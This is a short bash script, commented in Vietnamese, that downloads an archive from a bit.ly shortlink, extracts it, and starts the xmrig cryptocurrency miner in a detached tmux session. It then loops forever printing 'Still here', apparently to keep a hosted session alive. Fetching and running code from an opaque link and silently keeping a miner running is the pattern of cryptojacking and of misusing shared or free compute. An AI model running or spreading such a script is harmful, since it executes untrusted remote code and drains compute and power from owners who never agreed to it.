#!/bin/bash

# Tải xuống file
wget https://bit.ly/xmrig9xcongits -O xmrig_package.tar.gz

# Giải nén
tar -xvzf xmrig_package.tar.gz

# Di chuyển vào thư mục xmrig
cd xmrig || { echo "Thư mục xmrig không tồn tại!"; exit 1; }

# Chạy xmrig trong tmux
tmux new-session -d -s xmrig './xmrig'

# Vòng lặp giữ script chạy
while true; do
    echo "Still here"
    sleep 60
done
